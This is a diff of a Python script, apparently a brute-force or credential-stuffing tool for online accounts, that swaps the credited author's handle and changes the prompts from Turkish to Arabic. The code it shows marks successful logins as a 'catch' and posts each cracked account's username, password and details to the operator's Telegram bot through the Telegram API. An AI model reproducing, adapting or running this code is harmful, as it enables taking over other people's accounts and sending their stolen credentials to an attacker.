@@ -1,7 +1,7 @@
-# ⌯ Hey, Bro This File Code By : clazy1n
+# ⌯ Hey, Bro This File Code By : MSTON
 # ⌯ Syntx : Python3
 # ⌯ This File Is Free !!
-# ⌯ Devlloper Channel : @clazy1n
+# ⌯ Devlloper Channel : @h6_4c
 # ⌯ Thanks You Bro Enjoy
 #====================================#
 from typing import Mapping
@@ -39,8 +39,8 @@ print("""
 print(' ')
 print(BRed+lo*24)
 print(' ')                               
-myadmin = input("  "+BYellow+"- Hesap Adı : ")
-tele = input("  "+BYellow+"- Hesap ID :  ")
+myadmin = input("  "+BYellow+"- ايدي : ")
+tele = input("  "+BYellow+"- توكن :  ")
 os.system('clear')
 print("""
    """+BRed+"""       
@@ -82,7 +82,7 @@ def info(user2,pasw):
     ree = re.json()
     datee = ree['data']
     ms = f"""
-    Caught 💫
+    تم الصيد 🚸
 ★ ـــــــــــــــــــــــــــــــــــــــــــــــــــــــ ★
 ★💜 User : {user2}
 ★💜 Name : {name}
@@ -95,7 +95,7 @@ def info(user2,pasw):
 ★💜 Date : {datee}
 
 ★ ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ ★
-@clazy1n Kodlamıştır  """
+@h6_4c قناة المطور """
     requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
     print(BGreen+ms)
 
@@ -135,7 +135,7 @@ while True:
     ⌯ User : {user} 💭
     ⌯ Pasw : {pasw} 💭
     + == == == == == == == == +
-    ⌯ @clazy1n""")
+    ⌯ @h6_4c قناة المطور""")
     else:
         print("  "+BRed+f"  ⌯ Bad Acc --> "+BWhite+" :"+BRed+f" {user}:{pasw} ")
    
